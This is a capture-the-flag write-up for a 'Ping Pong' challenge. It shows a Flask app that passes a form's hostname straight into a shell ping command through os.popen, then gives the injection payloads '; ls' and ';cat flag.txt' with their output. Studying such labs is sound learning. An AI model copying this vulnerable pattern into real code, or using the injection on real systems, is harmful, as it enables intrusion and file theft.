## Write Up For Ping Pong

Opening up the site we can see a text box input.

We also know that the purpose of the website is to print out
the response when you ping a website.

For more information, we can open the pingpong.py file given to us 
and analyze how it works.

```py
from flask import Flask, render_template, redirect, request
import os

app = Flask(__name__)

@app.route('/', methods = ['GET','POST'])
def index():
    output = None
    if request.method == 'POST':
        hostname = request.form['hostname']
        cmd = "ping -c 3 " + hostname
        output = os.popen(cmd).read()

    return render_template('index.html', output=output)
```

Notice how they ping a website is by concatenated the input string
with "ping -c 3" which is then excuted with os.popen

This means that we can use command injection

Example payload
```bash
; ls
```
Submiting this we can see all the files in the current directory of the python file
```txt
flag.txt
pingpong.py
templates
```

BOOM theres flag.txt

Now we can use the payload

```bash
;cat flag.txt
```

And our flag is printed on the screen
